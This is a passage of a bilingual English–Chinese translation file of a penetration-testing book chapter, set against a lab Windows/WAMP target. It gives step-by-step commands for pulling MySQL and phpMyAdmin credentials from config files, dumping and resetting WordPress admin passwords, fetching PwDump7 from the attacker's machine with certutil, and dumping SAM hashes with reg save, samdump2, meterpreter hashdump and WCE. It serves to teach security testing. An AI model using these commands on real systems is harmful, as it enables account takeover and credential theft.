    Nmap 扫描，并识别出多个应用程序，其中大多数是利用某种形式认证的 web 应用程序。这些是我们可以攻击的应用程序：
- en: MySQL Server
  id: totrans-114
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: MySQL 服务器
- en: phpMyAdmin
  id: totrans-115
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: phpMyAdmin
- en: WordPress
  id: totrans-116
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: WordPress
- en: 'Let''s learn how to find and identify the configuration files that are used
    to store credentials by these applications:'
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们来学习如何查找和识别这些应用程序用来存储凭证的配置文件：
- en: The first step in this process is to identify the web hosting stack being used.
    As highlighted in the following screenshot, navigating to the root of the filesystem
    reveals that the hosting stack that's been installed is **Windows Apache MySQL
    PHP** (**WAMP**):![Figure 7.6 – WAMP](Images/B17389_07_006.jpg)
  id: totrans-118
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 该过程的第一步是识别正在使用的 web 托管堆栈。正如下面的截图所示，导航到文件系统根目录可以揭示已安装的托管堆栈是 **Windows Apache
    MySQL PHP**（**WAMP**）：![图 7.6 – WAMP](Images/B17389_07_006.jpg)
- en: Figure 7.6 – WAMP
  id: totrans-119
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 7.6 – WAMP
- en: 'We can explore the contents of the **wamp** directory to determine what web
    applications are being hosted. This can be done by running the following command:'
  id: totrans-120
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 我们可以通过浏览 **wamp** 目录的内容来确定托管了哪些 web 应用程序。可以通过运行以下命令来实现：
- en: '**cd wamp\www\**'
  id: totrans-121
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**cd wamp\www\**'
- en: 'As highlighted in the following screenshot, the contents of the directory reveal
    that WordPress has been installed on the server:'
  id: totrans-122
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 正如下面的截图所示，目录的内容显示 WordPress 已安装在服务器上：
- en: '![Figure 7.7 – WordPress directory'
  id: totrans-123
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 7.7 – WordPress 目录'
- en: '](Images/B17389_07_007.jpg)'
  id: totrans-124
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_007.jpg)'
- en: Figure 7.7 – WordPress directory
  id: totrans-125
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 7.7 – WordPress 目录
- en: '**WordPress** is a content management system that requires a database – in
    this case, **MySQL** – to store data and user credentials. Connecting to the database
    is facilitated through a remote connection, and the database access credentials
    are stored in the **wp-config.php** file. We can list the contents of this file
    by navigating into the WordPress installation directory and running the following
    command in the Windows command shell:'
  id: totrans-126
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**WordPress** 是一个内容管理系统，需要一个数据库——在这个案例中是 **MySQL**——来存储数据和用户凭证。通过远程连接来连接数据库，数据库的访问凭证存储在
    **wp-config.php** 文件中。我们可以通过进入 WordPress 安装目录，并在 Windows 命令行中运行以下命令来列出此文件的内容：'
- en: '**type wp-config.php**'
  id: totrans-127
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**type wp-config.php**'
- en: 'As highlighted in the following screenshot, the content of the file reveals
    the MySQL username and password combination that we can use to log in:'
  id: totrans-128
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 正如下面的截图所示，文件的内容揭示了我们可以用来登录的 MySQL 用户名和密码组合：
- en: '![Figure 7.8 – wp-config.php MySQL credentials'
  id: totrans-129
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 7.8 – wp-config.php MySQL 凭证'
- en: '](Images/B17389_07_008.jpg)'
  id: totrans-130
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_008.jpg)'
- en: Figure 7.8 – wp-config.php MySQL credentials
  id: totrans-131
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 7.8 – wp-config.php MySQL 凭证
- en: 'In this case, we can get the root username and password for the MySQL server
    and log in remotely from Kali by running the following command:'
  id: totrans-132
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在这种情况下，我们可以获取 MySQL 服务器的根用户名和密码，并通过运行以下命令从 Kali 远程登录：
- en: '**mysql -u root -p -h <TARGET-IP>**'
  id: totrans-133
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**mysql -u root -p -h <TARGET-IP>**'
- en: 'As highlighted in the following screenshot, after successful authentication,
    we should now have root access to the MySQL Server and view and dump the contents
    of any database on the server:'
  id: totrans-134
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如以下截图所示，成功认证后，我们现在应当能够访问 MySQL 服务器的根权限，并查看和导出服务器上任何数据库的内容：
- en: '![Figure 7.9 – MySQL login'
  id: totrans-135
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 7.9 – MySQL 登录](Images/B17389_07_010.jpg)'
- en: '](Images/B17389_07_009.jpg)'
  id: totrans-136
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_009.jpg)'
- en: Figure 7.9 – MySQL login
  id: totrans-137
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 7.9 – MySQL 登录
- en: 'We can now dump the list of databases on the server. This can be done by running
    the following command in the MySQL prompt:'
  id: totrans-138
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们现在可以导出服务器上的数据库列表。可以通过在 MySQL 提示符下运行以下命令来完成：
- en: '**show databases;**'
  id: totrans-139
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**show databases;**'
- en: 'As highlighted in the following screenshot, the command will output a list
    of databases on the server:'
  id: totrans-140
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如以下截图所示，该命令将输出服务器上的数据库列表：
- en: '![Figure 7.10 – MySQL databases](Images/B17389_07_010.jpg)'
  id: totrans-141
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![图 7.10 – MySQL 数据库](Images/B17389_07_010.jpg)'
- en: Figure 7.10 – MySQL databases
  id: totrans-142
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 7.10 – MySQL 数据库
- en: 'We can dump the contents of the WordPress database by running the following
    command in the MySQL prompt:'
  id: totrans-143
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以通过在 MySQL 提示符下运行以下命令来导出 WordPress 数据库的内容：
- en: '**use wordpress;**'
  id: totrans-144
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**use wordpress;**'
- en: 'This reveals a list of tables in the WordPress database. We can dump the user
    credentials for the WordPress installation by running the following command:'
  id: totrans-145
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 这将显示 WordPress 数据库中的表格列表。我们可以通过运行以下命令导出 WordPress 安装的用户凭证：
- en: '**select * from wp_users;**'
  id: totrans-146
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**select * from wp_users;**'
- en: 'As highlighted in the following screenshot, this will reveal the WordPress
    user''s credentials:'
  id: totrans-147
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如以下截图所示，这将揭示 WordPress 用户的凭证：
- en: '![Figure 7.11 – WordPress credentials'
  id: totrans-148
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 7.11 – WordPress 凭证](Images/B17389_07_011.jpg)'
- en: '](Images/B17389_07_011.jpg)'
  id: totrans-149
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_011.jpg)'
- en: Figure 7.11 – WordPress credentials
  id: totrans-150
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 7.11 – WordPress 凭证
- en: The user passwords are encrypted in MD5 and can be decrypted to reveal the cleartext
    password.
  id: totrans-151
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 用户密码以 MD5 加密，可以解密以显示明文密码。
- en: 'Additionally, given the fact that we have root access to the MySQL server,
    we can change the password for the admin account by running the following command:'
  id: totrans-152
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 此外，鉴于我们已拥有 MySQL 服务器的根权限，我们可以通过运行以下命令来更改管理员账户的密码：
- en: '**update wp_users set user_pass = MD5(''password123!'') where ID = 1;**'
  id: totrans-153
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**update wp_users set user_pass = MD5(''password123!'') where ID = 1;**'
- en: We can now log into the WordPress admin dashboard with the password we have
    just set and should have administrative control over the WordPress site.
  id: totrans-154
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 我们现在可以使用刚刚设置的密码登录 WordPress 管理后台，并应拥有对 WordPress 网站的管理员控制权限。
- en: So far, we have taken control of the MySQL Server and the WordPress site. Now,
    let's find the credentials of the other applications.
  id: totrans-155
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 到目前为止，我们已控制了 MySQL 服务器和 WordPress 网站。现在，让我们找到其他应用程序的凭证。
- en: 'The server is also running phpMyAdmin. We can gain access to the phpMyAdmin
    control panel by accessing the content of the file, as follows:'
  id: totrans-156
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 服务器还在运行 phpMyAdmin。我们可以通过访问该文件的内容来访问 phpMyAdmin 控制面板，如下所示：
- en: '**C:\wamp\apps\phpmyadmin3.4.10.1\config.inc.ini.php**'
  id: totrans-157
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**C:\wamp\apps\phpmyadmin3.4.10.1\config.inc.ini.php**'
- en: 'As highlighted in the following screenshot, this will reveal the access credentials
    for the phpMyAdmin control panel:'
  id: totrans-158
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如以下截图所示，这将揭示 phpMyAdmin 控制面板的访问凭证：
- en: '![Figure 7.12 – phpMyAdmin credentials'
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 7.12 – phpMyAdmin 凭证](Images/B17389_07_009.jpg)'
- en: '](Images/B17389_07_012.jpg)'
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_012.jpg)'
- en: Figure 7.12 – phpMyAdmin credentials
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.12 – phpMyAdmin 凭证
- en: We should now have root access to the phpMyAdmin control panel and be able to
    create, modify, and delete the contents of databases.
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在应该已经拥有 phpMyAdmin 控制面板的根权限，并能够创建、修改和删除数据库内容。
- en: Now that we have taken control of the MySQL Server and the WordPress site, we
    can start dumping Windows user account hashes to elevate our privileges.
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经控制了 MySQL 服务器和 WordPress 网站，我们可以开始导出 Windows 用户账户的哈希值，以提升我们的权限。
- en: Dumping Windows hashes
  id: totrans-164
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 导出 Windows 哈希值
- en: In this section, we will take a closer look at Windows passwords and how they
    are hashed. The hash dumping process on Windows can be performed by using various
    techniques and tools, most of which we will explore in this section. Before we
    begin using any tools or techniques, we need to take a brief look at how Windows
    passwords are stored.
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将更详细地探讨 Windows 密码及其哈希方式。Windows 上的哈希导出过程可以通过各种技术和工具来完成，我们将在本节中探讨大部分技术。在开始使用任何工具或技术之前，我们需要简要了解
    Windows 密码是如何存储的。
- en: SAM database
  id: totrans-166
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: SAM 数据库
- en: '**Security Account Manager** (**SAM**) is a database that is responsible for
    managing user accounts and passwords on Windows. All the passwords that are stored
    in the SAM database are hashed. Authentication and verification of user credentials
    is facilitated by the **local security authority** (**LSA**).'
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: '**安全帐户管理器**（**SAM**）是一个负责管理 Windows 上用户帐户和密码的数据库。存储在 SAM 数据库中的所有密码都是经过哈希的。用户凭据的认证和验证由**本地安全机构**（**LSA**）协助。'
- en: 'The SAM database is stored in the Windows Registry and can be accessed from
    the following location:'
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: SAM 数据库存储在 Windows 注册表中，可以从以下位置访问：
- en: HKEY_LOCAL_MACHINE\SAM
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: HKEY_LOCAL_MACHINE\SAM
- en: Now that we know where Windows user credentials are stored, we need to take
    a closer look at **LanMan** (**LM**) and NTLM authentication.
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们知道了 Windows 用户凭据存储的位置，我们需要更仔细地查看**LanMan**（**LM**）和 NTLM 认证。
- en: LM and NTLM hashing
  id: totrans-171
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: LM 和 NTLM 哈希
- en: 'LM is an authentication protocol that''s developed by IBM and widely implemented
    in Windows operating systems prior to NT4.0\. The protocol is used to encrypt
    user passwords, and the hashing process can be broken down into the following
    steps:'
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: LM 是由 IBM 开发的一种认证协议，并在 NT4.0 之前广泛应用于 Windows 操作系统。该协议用于加密用户密码，哈希过程可以分解为以下步骤：
- en: The password is converted into a hash by breaking it into two seven-character
    chunks.
  id: totrans-173
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 密码通过将其分成两个七字符的块来转换为哈希。
- en: All characters are then converted into uppercase.
  id: totrans-174
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 所有字符都将转换为大写。
- en: Each chunk is then encrypted with a 56-bit DES key.
  id: totrans-175
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 每个块都使用 56 位 DES 密钥进行加密。
- en: 'LM is generally considered to be a weak protocol and can easily be cracked,
    primarily because of the following reasons:'
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: LM 通常被认为是一种弱协议，容易被破解，主要原因如下：
- en: The 56-bit DES key is weak and can be cracked relatively easily.
  id: totrans-177
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 56 位的 DES 密钥较弱，且相对容易破解。
- en: Because the characters are converted into uppercase, this makes the cracking
    process relatively simple through a brute-force or dictionary attack.
  id: totrans-178
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 由于字符会被转换为大写，因此通过暴力破解或字典攻击，破解过程相对简单。
- en: Versions of Windows that utilize LM are restricted to a maximum of 14 characters
    for user account passwords.
  id: totrans-179
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 使用 LM 的 Windows 版本对于用户帐户密码限制最多为 14 个字符。
- en: Now that we understand how LM hashing works, we can look at NTLM hashing, which
    is an improvement in terms of security over LM.
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们了解了 LM 哈希的工作原理，我们可以看看 NTLM 哈希，它在安全性方面优于 LM。
- en: NTLM is a collection of authentication protocols that are utilized in Windows
    to facilitate authentication between computers. The authentication process involves
    using a valid username and password to authenticate successfully.
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: NTLM 是一组在 Windows 中用于促进计算机之间认证的协议。认证过程涉及使用有效的用户名和密码来成功进行认证。
- en: NTLM authentication operates under the client-server model of communication
    and involves a handshake process, similar to the TCP three-way handshake. We explored
    the NTLM authentication process in the previous chapter, so we will only be exploring
    the differences between LM and NTLM hashing here.
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: NTLM 认证操作基于客户端-服务器通信模型，并涉及握手过程，类似于 TCP 的三次握手。我们在上一章中探讨了 NTLM 认证过程，所以这里仅探讨 LM
    和 NTLM 哈希的区别。
- en: 'NTLM operates under a challenge response system, and the hashing process can
    be broken down into the following steps:'
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: NTLM 操作基于挑战应答系统，哈希过程可以分解为以下步骤：
- en: When a user account is created, it is encrypted using the MD4 hashing algorithm,
    while the original password is disposed of.
  id: totrans-184
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 当用户帐户创建时，它会使用 MD4 哈希算法进行加密，而原始密码则被丢弃。
- en: During authentication, the username is sent to the server. The server then creates
    a 16-byte random string and sends it to the client. This is known as the challenge.
  id: totrans-185
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在认证过程中，用户名被发送到服务器。然后，服务器创建一个16字节的随机字符串并发送给客户端。这就是所谓的挑战。
- en: The client encrypts the string with the password hash using the **Data Encryption
    Standard** (**DES**) algorithm and sends it back to the server. This is known
    as the response.
  id: totrans-186
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 客户端使用**数据加密标准**（**DES**）算法加密该字符串与密码哈希，然后将其发送回服务器。这就是所谓的应答。
- en: The server then compares the hashed string (response) to the original. If it
    matches, authentication is completed.
  id: totrans-187
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 服务器接着将哈希后的字符串（应答）与原始数据进行比对。如果匹配，则完成认证。
- en: 'The following table highlights the key differences between LM and NTLM and
    how each protocol handles encryption:'
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: 下表突出了 LM 和 NTLM 之间的主要区别，以及每种协议如何处理加密：
- en: '![](Images/B17389_07_Table1.jpg)'
  id: totrans-189
  prefs: []
  type: TYPE_IMG
  zh: '![](Images/B17389_07_Table1.jpg)'
- en: Now that we understand how LM and NTLM hashing works, we can begin exploring
    the process of dumping hashes on our target system.
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经了解了LM和NTLM哈希的工作原理，接下来可以开始探索在目标系统上转储哈希的过程。
- en: Utilizing PwDump7
  id: totrans-191
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 使用PwDump7
- en: 'The first tool we will be utilizing is called **PwDump7.exe**. It is a Windows
    binary that extracts the SAM database and dumps the hashes. It needs to be run
    locally on the target system. You can download the binary from this link: [https://www.tarasco.org/security/pwdump_7/](https://www.tarasco.org/security/pwdump_7/).'
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将使用的第一个工具是**PwDump7.exe**。它是一个Windows二进制程序，用于提取SAM数据库并转储哈希值。它需要在目标系统上本地运行。您可以通过以下链接下载该二进制文件：[https://www.tarasco.org/security/pwdump_7/](https://www.tarasco.org/security/pwdump_7/)。
- en: 'After downloading the binary, we need to transfer it to the target system.
    This can be done automatically through meterpreter by running the following command
    in the meterpreter shell:'
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: 下载二进制文件后，我们需要将其传输到目标系统。这可以通过meterpreter自动完成，方法是在meterpreter shell中运行以下命令：
- en: upload ~/Downloads/pwdump7/PwDump7.exe
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: 上传 ~/Downloads/pwdump7/PwDump7.exe
- en: Alternatively, if you are running a standard command shell, we will need to
    set up a web server on our Kali VM. This will be used to host the binary so that
    we can download it on the target system. This can be done by following the procedure
    outlined here.
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: 或者，如果您使用的是标准命令行，我们需要在Kali虚拟机上设置一个Web服务器。这个服务器将用于托管二进制文件，以便我们可以在目标系统上下载它。可以按照这里概述的步骤来完成：
- en: 'To set up a web server on our Kali VM, we can utilize the **SimpleHTTPServer**
    Python module to serve the binary file. This can be done by running the following
    command in the directory where the **PwDump7.exe** binary is stored:'
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: 要在我们的Kali虚拟机上设置一个Web服务器，我们可以使用**SimpleHTTPServer** Python模块来提供二进制文件。这可以通过在存储**PwDump7.exe**二进制文件的目录中运行以下命令来完成：
- en: sudo python -m SimpleHTTPServer 80
  id: totrans-197
  prefs: []
  type: TYPE_NORMAL
  zh: sudo python -m SimpleHTTPServer 80
- en: To download the **PwDump7.exe** binary on the target system, we can utilize
    the **certutil** utility. However, before we can download the binary, we need
    to navigate to a directory where we have read and write permissions. In this case,
    we will navigate to the current user's **Desktop** directory.
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: 要在目标系统上下载**PwDump7.exe**二进制文件，我们可以使用**certutil**工具。然而，在下载二进制文件之前，我们需要导航到一个具有读写权限的目录。在这种情况下，我们将导航到当前用户的**桌面**目录。
- en: 'We can now use the **certutil** utility to download the binary from the Kali
    VM onto our target system. This can be done by running the following command on
    the target system:'
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们可以使用**certutil**工具将二进制文件从Kali虚拟机下载到目标系统。这可以通过在目标系统上运行以下命令来完成：
- en: certutil -urlcache -f http://<KALI-VM-IP>/PwDump7.exe PwDump7.exe
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: certutil -urlcache -f http://<KALI-VM-IP>/PwDump7.exe PwDump7.exe
- en: 'As shown in the following screenshot, if the transfer is successful, the binary
    should be downloaded and saved with the name we specified:'
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
  zh: 如下图所示，如果传输成功，二进制文件应该已经下载并保存为我们指定的名称：
- en: '![Figure 7.13 – certutil successful transfer'
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: '![图7.13 – certutil成功传输'
- en: '](Images/B17389_07_013.jpg)'
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_013.jpg)'
- en: Figure 7.13 – certutil successful transfer
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 图7.13 – certutil成功传输
- en: 'We can also save the registry values of the SAM file manually on the target
    system and use the PwDdump utility to dump the hashes. This can be done by running
    the following command:'
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还可以手动保存目标系统上SAM文件的注册表值，并使用PwDdump工具来转储哈希值。这可以通过在目标系统上运行以下命令来完成：
- en: reg save hklm\sam c:\sam
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: reg save hklm\sam c:\sam
- en: 'If the operation was successful, you should receive a message similar to the
    one highlighted in the following screenshot:'
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: 如果操作成功，您应该会收到一条类似于下图所示的消息：
- en: '![Figure 7.14 – Dump SAM](Images/B17389_07_014.jpg)'
  id: totrans-208
  prefs: []
  type: TYPE_IMG
  zh: '![图7.14 – 转储SAM](Images/B17389_07_014.jpg)'
- en: Figure 7.14 – Dump SAM
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: 图7.14 – 转储SAM
- en: 'We can now execute the binary to dump the hashes by running the following command:'
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在可以执行二进制文件，通过运行以下命令来转储哈希值：
- en: .\PwDump7.exe -s <SAMFILE> <SYSTEM-FILE>
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
  zh: .\PwDump7.exe -s <SAMFILE> <SYSTEM-FILE>
- en: This will dump the Windows hashes from the SAM database, which we will crack
    in the next section.
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: 这将从SAM数据库中转储Windows哈希值，我们将在下一节中破解这些哈希值。
- en: In the case of our target system, this technique will not work. However, it
    is a useful utility and will work on most versions of Windows.
  id: totrans-213
  prefs: []
  type: TYPE_NORMAL
  zh: 对于我们的目标系统，这种技术将无法工作。然而，它是一个有用的工具，适用于大多数Windows版本。
- en: Utilizing SamDump2
  id: totrans-214
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 使用SamDump2
- en: 'We can also save the registry values of the SAM file manually on the target
    system and use the SamDump2 utility to dump the hashes. This can be done by running
    the following command:'
  id: totrans-215
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还可以手动保存目标系统上SAM文件的注册表值，并使用SamDump2工具来转储哈希值。这可以通过运行以下命令来完成：
- en: reg save hklm\sam c:\sam
  id: totrans-216
  prefs: []
  type: TYPE_NORMAL
  zh: reg save hklm\sam c:\sam
- en: 'If the operation was successful, you should receive a message similar to the
    one highlighted in the following screenshot:'
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: 如果操作成功，您应该会收到类似以下截图中突出显示的信息：
- en: '![Figure 7.15 – Dump SAM'
  id: totrans-218
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 7.15 – 提取 SAM](Images/B17389_07_015.jpg)'
- en: '](Images/B17389_07_015.jpg)'
  id: totrans-219
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_015.jpg)'
- en: Figure 7.15 – Dump SAM
  id: totrans-220
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.15 – 提取 SAM
- en: 'We can now download the SAM file from the root of the filesystem to our Kali
    VM. This can be done automatically through meterpreter by running the following
    command:'
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在可以将 SAM 文件从文件系统根目录下载到我们的 Kali 虚拟机。这可以通过 meterpreter 自动完成，运行以下命令：
- en: download sam
  id: totrans-222
  prefs: []
  type: TYPE_NORMAL
  zh: download sam
- en: 'As highlighted in the following screenshot, the SAM file should be downloaded
    to our home directory on Kali:'
  id: totrans-223
  prefs: []
  type: TYPE_NORMAL
  zh: 如下截图所示，SAM 文件应该已下载到我们 Kali 主目录中：
- en: '![Figure 7.16 – Downloading the SAM file'
  id: totrans-224
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 7.16 – 下载 SAM 文件](Images/B17389_07_018.jpg)'
- en: '](Images/B17389_07_016.jpg)'
  id: totrans-225
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_016.jpg)'
- en: Figure 7.16 – Downloading the SAM file
  id: totrans-226
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.16 – 下载 SAM 文件
- en: 'We can now use the SamDump2 utility on Kali Linux to dump the hashes from the
    file. This can be done by running the following command on Kali:'
  id: totrans-227
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在可以在 Kali Linux 上使用 SamDump2 工具从文件中提取哈希值。可以通过在 Kali 上运行以下命令来完成此操作：
- en: samdump2 system sam
  id: totrans-228
  prefs: []
  type: TYPE_NORMAL
  zh: samdump2 system sam
- en: This will dump the hashes from the SAM file, which we can now crack to obtain
    the cleartext password.
  id: totrans-229
  prefs: []
  type: TYPE_NORMAL
  zh: 这将从 SAM 文件中提取哈希值，我们现在可以破解这些哈希以获取明文密码。
- en: 'This process can also be automated using the **hashdump** meterpreter command,
    like so:'
  id: totrans-230
  prefs: []
  type: TYPE_NORMAL
  zh: 此过程也可以通过使用 **hashdump** meterpreter 命令来自动化，命令如下：
- en: hashdump
  id: totrans-231
  prefs: []
  type: TYPE_NORMAL
  zh: hashdump
- en: 'If successful, the output should reveal all the user account hashes on the
    system, as highlighted in the following screenshot:'
  id: totrans-232
  prefs: []
  type: TYPE_NORMAL
  zh: 如果成功，输出应该会显示系统上所有用户帐户的哈希值，如以下截图所示：
- en: '![Figure 7.17 – Hashdump'
  id: totrans-233
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 7.17 – Hashdump](Images/B17389_07_017.jpg)'
- en: '](Images/B17389_07_017.jpg)'
  id: totrans-234
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_017.jpg)'
- en: Figure 7.17 – Hashdump
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.17 – Hashdump
- en: In this particular case, the **hashdump** command gives us all the user account
    hashes on the system. We can save the hashes into a file called **hashes.txt**
    on our Kali virtual machine. We will take a look at how to use these hashes in
    the next section.
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，**hashdump** 命令会显示系统上所有用户帐户的哈希值。我们可以将这些哈希保存到名为 **hashes.txt** 的文件中，保存在我们的
    Kali 虚拟机上。接下来，我们将讨论如何使用这些哈希值。
- en: Utilizing Windows Credentials Editor
  id: totrans-237
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 使用 Windows 凭据编辑器
- en: Another great utility we can use to dump password hashes is the **Windows Credentials
    Editor**, also known as **WCE**. WCE lists logon sessions and their corresponding
    NTLM hashes. The binary comes pre-packaged with Kali and will need to be run locally
    on the target system.
  id: totrans-238
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个我们可以使用的强大工具是 **Windows 凭据编辑器**，也叫做 **WCE**。WCE 列出了登录会话及其对应的 NTLM 哈希。该二进制文件预装在
    Kali 中，需要在目标系统上本地运行。
- en: 'We can upload the binary to the target using meterpreter by running the following
    command:'
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以通过运行以下命令，使用 meterpreter 将二进制文件上传到目标系统：
- en: upload /usr/share/windows-resources/wce/wce64.exe
  id: totrans-240
  prefs: []
  type: TYPE_NORMAL
  zh: upload /usr/share/windows-resources/wce/wce64.exe
- en: In the event you are using a standard command shell, you can use the **certutil**
    utility to transfer the binary to the target system.
  id: totrans-241
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您使用的是标准命令行 shell，可以使用 **certutil** 工具将二进制文件传输到目标系统。
- en: 'After transferring the binary to the target system, we can execute the binary
    by running the following command:'
  id: totrans-242
  prefs: []
  type: TYPE_NORMAL
  zh: 将二进制文件传输到目标系统后，我们可以通过运行以下命令执行该二进制文件：
- en: .\wce64.exe
  id: totrans-243
  prefs: []
  type: TYPE_NORMAL
  zh: .\wce64.exe
- en: 'This will output a list of logon sessions and their corresponding hashes, as
    shown in the following screenshot:'
  id: totrans-244
  prefs: []
  type: TYPE_NORMAL
  zh: 这将输出一份登录会话及其对应哈希的列表，如以下截图所示：
- en: '![Figure 7.18 – WCE hashes'
  id: totrans-245
  prefs: []
  type: TYPE_NORMAL
